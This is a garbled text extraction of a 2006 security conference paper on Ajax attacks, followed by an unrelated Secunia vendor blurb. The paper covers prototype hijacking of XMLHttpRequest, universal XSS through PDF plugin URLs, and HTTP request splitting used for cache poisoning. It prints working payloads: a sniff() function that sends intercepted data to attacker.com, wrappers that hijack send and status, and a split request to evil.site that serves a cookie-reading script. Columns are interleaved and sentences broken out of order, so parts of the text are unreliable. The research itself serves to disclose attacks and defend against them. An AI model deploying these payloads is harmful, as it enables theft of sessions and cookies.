II. HOW AJAX WORKS

December 2006

asynchronous   requests   introduces   a   new   type   of   attack

vectors.   In   particular,   an   attacker   can   inject   client   side

code  to totally  subvert the  communication  flow  between

client   and   server.     In   fact,   advanced   features   of   Ajax

framework build up a new transparent layer not controlled

by the user. This paper will focus  on  security aspects of

Ajax   technology   and   on   their   influence   upon   privacy

issues.   Ajax   is   not   only   a   group   of   features   for   web

developers: it's a new paradigm that allows leveraging the

most refined client side attacks.

I. INTRODUCTION

Ajax[1]  is an  acronym  for  Asynchronous  Javascript
And XML. Ajax is not a new programming language,
is   an   umbrella   term   which   describes   a   group   of
features  and   enhancements  to   improve    appearance
and functionality of traditional web sites.
Ajax relies on XMLHttpRequest[2], CSS, DOM and
other technologies; the main characteristic of AJAX
is its “asynchronous” nature, which makes possible to
send and receive data from the server without having
to refresh the page. Common Ajax implementations
can be found in various languages and libraries like
ActiveX, Flash and Java applet.
This paper will focus on Javascript language, because
is   considered   the   formal  standard   in   Web   2.0
application development.
The   large   adoption   of   Javascript   in   Html   code
permits   to   create   a   transparent   data   exchange
between client  and  server. Users  then interact  with
standard   Html   objects   controlled   by   classes   and
procedures interpreted by their browsers.
Some examples of web applications that already use
Ajax are GMail, GoogleMaps or Live.com.

To   completely   understand   the   functioning   of   web
applications   integrated   with   Ajax,   we   can   look   at
figure   1   to   see   the   classic   web   application   model,
compared to the asynchronous one.
As   we   can   see,   asynchronous   requests   through
XMLHttpRequest   in   Ajax   model   are   totally
transparent to the end user.
Ajax   model   let   the   application   send   Http   requests
and   information   without   displaying   any   visual
acknowledgment, even on the browser's status bar.

Figure 1: Classic and Asynchronous models compared

In   Ajax   applications,   as   soon   as   the   browser   has
loaded the libraries of the application, users will not
experience   common   waitings   in   page   loading.   Ajax
framework and web server can refresh the content by
pushing  the data  to  the browser User Interface via
DOM[3] manipulation (Document Object Module).

policy to the  same origin. This kind of control will
deny   any   request   made   outside   actual   host,
considering port and protocol.
Other classes and implementations diversify security
policies to the context and scope of the object during
the use of different objects.

We   will   see   below   different   techniques   to   bypass
imposed restrictions.

III. AJAX KNOWN PROBLEMS

Applications   based   upon   Ajax   are   affected   by   the
same   problems   of   any   other   web   application,   but
usually   are   more   complex   because   of   their
asynchronous   nature.   During   development   it's
important   to   take   care   of   all   singular   aspects,
without focusing only on some functionalities and on
features related to business needs.
Superior   framework   complexity   can   lead   developers
to not refine the security aspects and to shorten the
testing process. In addition it's a common thought to
consider asynchronous requests non duplicable events
outside  the application.  It's  important to  point  out
that   such   requests   are   based   on   client-side   HTTP
protocol which is not reliable from a security point of
view (the sender can be impersonated if TLS is not
used).
Ajax problems are present both client side and server
side and can be classified as follows:

1. System Architecture;
2. Authorization and authentication;
3. Client/Server communication;
4. Management   of   communication   (usually

XML);

5. Client and Server are not trusted.

Analysis   of   previous   problems   can   be   found   in
publications of a number of researchers, in particular
Jeremiah Grossman[6], Billy Hoffman[7] and Andrew
Van der Stock[8]. It's suggested to read also OWASP
articles about Ajax Security[9]

In table 1 we can see a piece of javascript code where
XMLHttpRequest object is  used to  send some data
to a web server via the POST method.
As   soon   as   the   code   is   processed,   'xmlhttp'   object
will   set   any   information   about   the   data   being
exchanged, even a response that can be used by the
application, if needed.
It's   important   to   point   out   that   XMLHttpRequest
Object   is   not   the   only   available   tool   to   send
asynchronous  requests:  it's  possible  to   find  in  some
client-side  languages, browsers  and  plugins different
ways to deliver bidirectional requests.

var xmlhttp=null;
 try {
  xmlhttp = new
            ActiveXObject("Msxml2.XMLHTTP");
 } catch (e) {
   xmlhttp = false;
  }

 if(!xmlhttp && typeof

 XMLHttpRequest!='undefined') {

try {
        xmlhttp = new XMLHttpRequest();
} catch (e) {

xmlhttp=false;

}

  }
  xmlhttp.open("POST", "/",true);
  xmlhttp.setRequestHeader("Header", "Value");

  xmlhttp.onreadystatechange=function() {
  if (xmlhttp.readyState==4)
     if(xmlhttp.status==200)
      elaboraResponse(xmlhttp.responseText)

  }
  xmlhttp.send("data");
  xmlhttp.close();

Table 1: Javascript Code implementing an asynchronous
request via XMLHttpRequest Object

  In   Mozilla   Javascript   language,   for   example,
SoapCall[4] is available; in Internet Explorer can be
used XMLDocument[5] to request an XML document
via GET method.
Any one of the objects above, will include a security
model   to   control   requests   to   external   domains.   In
particular   XMLHttpRequest   applies   a   restriction

IV. ADVANCED ATTACKS

XSS Prototype Hijacking

It will now be described a new advanced technique to
gain   total   control   over   an   Ajax   application.   This
attack  is  exclusively  based on  some  of  the intrinsic
properties   of   Prototype   Languages[11]   like
Javascript.
Prototype   based   programming   is   a   style   of   Object
Oriented programming where classes are not present;
indeed,   objects   are   cloned   from   already   existing
objects   (native   objects)   or   from   scratch   (empty
objects).   Eventually,   new   methods   or   attributes
belonging   to   an   object   could   be   created   or
reimplemented by simply defining them.

To   better   understand   this   approach   let's   see   an
example.   Let's instantiate a new XMLHttpRequest
writing:

var xmlhttp= new XMLHttpRequest();

When the code is interpreted and executed, XmlHttp
object   will   not   be   a   new   instance   of
XMLHttpRequest   class,   but   will   be   simply   cloned
from the original XMLHttpRequest object.

From developer's perspective, this very intuitive and
extensible approach could allow to add new methods
and attributes directly to native objects.

For Example:

XMLHttpRequest.newMethod= function() {

 return "value";

}

From now on, the new method will be available to all
new cloned objects by simply calling it:

xmlhttp.newMethod();

Although   these   features   are   powerful,   this
extensibility    could  allow   anyone  to   overwrite  even
the   native   objects.   Let's   see   how   it's   possible   to
implement a new object which will wrap the native
XMLHttpRequest and that, once injected in a XSS

Subverting Ajax – S.Di Paola, G.Fedon

attack,   will   allow   the   attacker   to   intercept   any
callable method and any available attribute.
The   new   object   and   the   attack   will   be   totally
transparent to the application and most of all to the
end user. It's important to notice that this technique
can   be   applied   to   several   objects   and   to   Internet
Explorer  ActiveX as well.
This technique has been found by S. Di Paola and is
called Prototype Hijacking. It represents the state of
the   art   in   hijacking   techniques   applied   to   the
Javascript language.

Figure 2: Hijacking Technique applied to Ajax based
applications (Prototype Hijacking).

The most important concept could  be explained by
looking at the following code:

var xmlreqc=XMLHttpRequest;
XMLHttpRequest = function() {

this.xml = new xmlreqc();
return this;

}

In   this   example,  the   reference  to   XMLHttpRequest
native   object   is   saved   in   a   new   variable   and
XMLHttpRequest is readdressed to a new object by
using   one   of   the   many   ways   of   creating   a
constructor. Inside the constructor, a new attribute is
instantiated   as   the   previously   saved   real
XMLHttpRequest. From now on, every cloned object

23rd CCC Conference

4

will   be   a   wrapper   clone   and   not   a   clone   of   the
original one.
What   follows   is   the   implementation   of   wrapper
methods   for   some   of   XMLHttpRequest   native
objects,   in   order   to   create   a   Man   in   the   middle
attack  (ref. Figure 2).
Before   we   go   into   deep   of   hijacking,   let's   suppose
there   is   a   'sniff()'   function   using   the   techniques
described by Rager[13] and Grossman[6]:

function sniff(){
var data='';

   for(var i=0; i<arguments.length; i++)
     data+=arguments[i];
  if(image==null)
     image = document.createElement('img');
  if(data.length> 1024)
     data= data.substring(0, 1024) ;
    image.src=

'http://www.attacker.com/hijacked.html?data='+data;

 }

Let's   now   show   some   examples   that   wrap   native
methods and intercept them.

XMLHttpRequest.prototype.send = function (pay){

// Hijacked .send
sniff("Hijacked: "+" "+pay);
pay=HijackRequest(pay);
return this.xml.send(pay);

  }

By taking advantage of the previous wrapper it will
be possible to dynamically intercept all data, and it
will   even     be   possible   to   modify   it   by   using   any
function (HijackRequest in this case).

Next code example could allow an attacker to modify
any native attribute values or application behaviour,
by using defineSetter and defineGetter methods[14]:

  XMLHttpRequest.prototype.__defineSetter__(

"multipart",function (h){  //  Hijacked multipart

this.xml.multipart=h
sniff("multipart: "+" "+h);
return  h;

});

  XMLHttpRequest.prototype.__defineGetter__(

'status",function (){ // Hijacked status

h=this.xml.status ;
sniff("status: "+" "+h);

  return  h;

  });

Subverting Ajax – S.Di Paola, G.Fedon

Actually, by using this attack technique, a malicious
user could modify or inject requests and responses by
using some specifically crafted functions in a
transparent way to the user and to the underneath
application.

As   a   final   and   better   clarifying   example   of   the
consequences   of   this   attack,   let's   consider   an   Ajax
application   developed   for   bank   transfers.   This
application has a web dialog to confirm transactions
and notifies the user via SMS for every bank transfer
operation accomplished by an authenticated user.

If this Ajax interface is exposed to an XSS or to any
related vulnerability, attacker will just have to inject
the code and to wait for a  bank  transfer and then
use the same code to redirect requests and responses
to him.
In  this case, the attack is totally  independent from
any   authentication   system   used   such   as   One   Time
Passwords or RSA tokens. Ajax  based applications,
could   be   subverted   by   ignoring   the   application
specific implementations or communication modes. A
paradise for phishing attacks.

Universal XSS

to

inside

Browsers   are   applications   with   a   lot   of   different
features,   and   as   we   have   seen   previously   are
extremely   powerful.   Unfortunately,   when   software
complexity   increases,   will   increase   also   the
it   potential
probability
vulnerabilities[15].
Vulnerability   discovery   projects   like   “Browser
Fun”[16]   of   H.D.   Moore,   disclosed   during   time,
dozens   of   problems   inside   IE   advanced   features.
Indeed   most   of   them   were   linked   to   memory
handling,   memory   corruption   and   buffer   overflows,
some of the most interesting problems rely on higher
level implementations like the integration of built-in
client functionalities with browser's plug-ins.
UXSS (Universal Cross Site Scripting) is a particular
type of Cross Site Scripting and has the ability to be
triggered by exploiting flaws inside browsers, instead
of leveraging the vulnerabilities against insecure web
sites.

23rd CCC Conference

For   example   we   can   use   Mozilla   Firefox   (version
1.5.0.7)   and   insert   in   the   URL   field   the   following
code:

it's   possible   to   cause   a  DoubleFree() error   and   to
overwrite part of the Structural Exception Handler.

javascript:alert(“Test Alert”)

V. CACHE POISONING

Firefox   browsers   will   consider   the   previous   URL   a
javascript object and will execute alert(“Test Alert”)
code opening   a   pop-up.   This   event   is   not   strange
since it's a feature of the browser.
We   can   generate   some   more   interesting   things   by
supplying   different  kind   of   objects   to   plug-ins  that
expect  a   website   URL   to   be  passed   in   parameters.
For   example,   Adobe   Acrobat   plugin   for   Mozilla
Firefox   (acroreader)   is   able   to   populate   Portable
Documents   forms   by   supplying   an   external   set   of
data through the FDF, XML, or XFDF fields.
Implementation   of   FDF,   XML,   XFDF   requests   in
Acrobat   Reader   Plugin   is   vulnerable   to   different
types of attacks (S. di Paola, G. Fedon e E. Florio -
Ottobre 2006)[16]:

1. UXSS in #FDF, #XML e #XFDF;
2. Universal CSRF and session riding;
3. Possible Remote Code Execution;

Examples:

1.   By   using   the   following   request,   is   possible   to
execute javascript code inside the browser:

http://site.com/file.pdf#FDF=javascript:alert(“Test Alert”)

Among   all  advanced   web   attacks,  there  is  a   whole
category which is not very known but it worth to be
analyzed   into   deep;   this   is   HTTP   Request   and
Response   Splitting   by   Amit   Klein   and   others
researchers[17][18].   These   attack   vectors   are
constrained by a single factor: the presence of a web
proxy (reverse or forward).
This situation is easily found in corporate networks
(LAN)   or   in   wide   area   networks   (WAN).   HTTP
Request  and Response  Splitting are different in the
way   they   are   accomplished   and   in   the   way   they
allows to modify proxy and browser cache.
In this paper it will be described the HTTP Request
Splitting   attack   as   it   takes   advantage   of   a   base
implementation   of   asynchronous   requests   like
XMLHttpRequest.
The reader could refer to [17] and [18] to go deeper
into the theory of both attacks.

HTTP Request splitting

A   Request   Splitting   attack   abuses   flaws   in
asyncronous   requests   and   allows   to   inject  arbitrary
headers when an Http request is built. The attack in
the   following   examples   is   accomplished   using   IE's
ActiveX object 'Microsoft.XMLHTTP', but there are
unfixed objects in other browsers that permit it too.

The previous could be triggered against an site and
because of this is a UXSS.

Let's make an example:

2. In addition it's possibile to make the browser send
requests   to   any   URL   (Universal   CSRF)   in   the
following way:

var x = new ActiveXObject("Microsoft.XMLHTTP");
x.open("GET\thttp://www.evil.site/2.html\tHTTP/1.1\r\nHost:\t
www.evil.site\r\nProxy-Connection:\tKeep-
Alive\r\n\r\nGET","/3.html",false);
x.send();

http://site.com/file.pdf#FDF=http://host.com/index.html?param
=...

A javascript request forged as in the previous code
will send the following requests:

3.  There is  also   a   possible  Remote Code  Execution
(RCE)   by   leveraging   a   memory   corruption   in   the
following request:

GET http://www.evil.site/2.html HTTP/1.1
Host: www.evil.site
Proxy-Connection:Keep-Alive

http://site.com/file.pdf#FDF=javascript:document.write(“jjjjj...”);

GET /3.html  HTTP/1.1
Host: www.evil.site
Proxy-Connection:Keep-Alive

If there is a web proxy in the middle of the
communication, it will see two requests asking for
two pages at http://www.evil.com. As it explained in
figure 3, the proxy will send the two requests and
will get two response:

Next  step  is  to   open  a   new   window   via   Javascript
with   any   host   address   (e.g.   http://www.bank.com)
and the browser will queue Response 1_2  instead of
the original page.

Response 1: http://www.evil.site/2.html:
  <html> <body>   foo   </body>  </html>

Response 1_2: http://www.evil.site/3.html:
<html>   <head>  <meta http-equiv="Expires"
content="Wed, 01 Jan 2020 00:00:00 GMT">

  <meta http-equiv="Cache-Control" content="public">
  <meta http-equiv="Last-Modified" content="Fri, 01 Jan 2010
00:00:00 GMT">
  </head> <body>
  <script>

alert("DEFACEMENT and XSS: your cookie
is"+document.cookie)
 </script>

  </body>
  </html>

from browser's point of view, only request 1 has been
sent,   so   Response   1_2   is   simply   put   into   browser
queue waiting to be associated to the next request.

Auto Injecting Cross Domain Scripting

It   will  be   presented   a   new   attack   technique   which
takes advantage of HTTP request-splitting or request
smuggling vulnerabilities and frame injection vectors.
As   a   result   of   this   attack   a   malicious   user   could
inject a particular snippet of javascript code into any
page   of   any   domain   to   take   control   over   user's
browsing sessions.
This new kind of attack has been called  AICS  and
has been thought by S. Di Paola and G. Fedon and
developed by S. Di Paola.

The Theory

In order to work there are some conditions to be met:

1. The user should have a forward proxy;
2. The user should have a browser or a plugin
vulnerable to request splitting/smuggling;
3. The   user   should   visit  a   malicious   site   or   a

site vulnerable to XSS (of any kind).

Often  happens  that  all  of   the conditions above  are
satisfied, in particular:

1.

2.

a   forward   proxy   is  often   used   in   corporate
LAN to give the users access to the internet;
there is  a   number  of  browsers and  browser
plugins   that   are   vulnerable   to   request
splitting/smuggling. A list could include:

•

•

•

•

IE 6.0 sp2 (HRS - not patched)
Flash   plugin   <7.x   and   <9.0.r16
(HRS)
Java VM version x.x (HR Smuggling)
etc.

3. A   user  could  be  forced  to   visit  a   malicious
site   by   taking   advantage   of   classic   social
engineering techniques or by abusing of one
of the attack vectors showed above.

Once   HRS   finds   its   environment,   an   attacker   can
inject fake html and javascript code in place of the
original   one.   When   HRS   was   discovered   by   Amit

23rd CCC Conference

7

Klein   it   was   thought   as   a   local   web   defacement
method in  a   cross domain  context.  This  is  a  really
dangerous scenario, but not the most dangerous one.
It should be noted, in fact, that a code injection into
every   page   and   into   every   domain   through   XSS
attack   types   like   the   ones   described   herein
(Prototype   Hijacking)   or   the   ones   documented   by
Jeremiah Grossman and Anton Rager, could turn a
single XSS into an auto injecting script.
Grossman's   technique   relies   on   scripts   containing
Iframe tags in order to take advantage of the “same
origin” policy applied to a single website (fig. 4).
This means that an attacker could get total control
over a website (which has a XSS vulnerability in it)
by simply controlling an inner frame.
If   a   browser   is   vulnerable   to   HRS   this   technique
could   be   applied   in   a   cross   domain   context   every
time   a   user   opens   a   new   page   or   exits   from   the
browser,   by   injecting   a   new   HRS.   So   even   if   a
website   in   not     vulnerable   to   XSS,   it   could   be
controlled.
In this scenario a user should visits an infected page
on a website (Fig. 5).  As soon as the script executes
the   malicious   request   splitting   and   redirects   the

Figure 4: A scheme of Grossmann's frame injection
technique

browser   to   the   homepage,   it   will   copy   itself   into
browser   local   cache   in   order   to   set   a   future
entrypoint.  Next time the user opens up an instance
of his preferred browser, the malicious script will be
ready   to   inject   itself   into   visited   pages   and   it   will
stay resident until browser cache would not be erased
manually.  In  order  to   accomplish  this  a   number  of
techniques are described by A. Klein in [21].

Subverting Ajax – S.Di Paola, G.Fedon

Figure 5: A scheme of Cross Domain Frame
Injection XDI

So far, as frame injection takes place, the user will
get   a   faked   homepage   but   the   right   address   in
browser's location bar.
At this point, the script listen for any event which
could  be  considered   a   domain  change   during   user's
navigation, such as:

1.

2.

3.

4.

onAbort   - Triggered when user presses stop
while a page is loading;
onBlur      -   Triggered   when   a   frame   or   a
window is not focused;
onUnload  -   Triggered   when   a   frame   or   a
document loads another url;
onClick   - Triggered when the user clicks on
a link.

In this way when the victim will ask for a new page
or for a new url, the script will be called by the event
trigger and it will perform a new HRS.
Differently   from   the   first   injection,   this   time   the
script  won't  redirect  the user  to  the  homepage  but
merely will wait for the user to ask for the page he is
going to load.
This   script   behaviour   will   assure   the   total   control
during  user's navigation and the attacker will have
the power to sniff and modify every packet passed to
the browser.

VI. CONCLUSIONS

We have seen that Ajax allows a new way to interact
with web applications. As usual, as new features are

23rd CCC Conference

8

implemented   new   attack   scenarios   open   to   the
horizon.
By using a new technique called Prototype Hijacking
it   has   been   shown   how   it   is   possible   to   sniff   and
manipulate   in   real   time   asynchronous   requests
originating   from   any   browser   in   a   way   which   is
transparent   and   independent   from   the   framework
used.
A   new   attack   vector   was   presented   as   UXSS   /
UCSRF which takes advantage of high level flaws in
browser integration with plug-ins.
It   follows   that   a   very   interesting   cache-injection
technique   permits   to   leverage   attacks   against   the
way   asynchronous   requests   are   made,   allowing   an
attacker to poison almost permanently the web sites
visited and stored into browser cache.
A new type of attack has been presented ('AICS') to
bypass   even   restrictions   imposed   by   web   sites   not
vulnerable   to   XSS.   It   should   be   noticed   that   an
attacker could take control over user navigation on
important websites by abusing a simple and detached
XSS vulnerability.
As it seems, Web 2.0 applications will be more and
more   tightly   tied   to   browser   security,   that   is
increasing   in  complexity   and   has   to   take  care  of   a
plethora of features that can be turned into weapons
if controlled by a malicious attacker.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
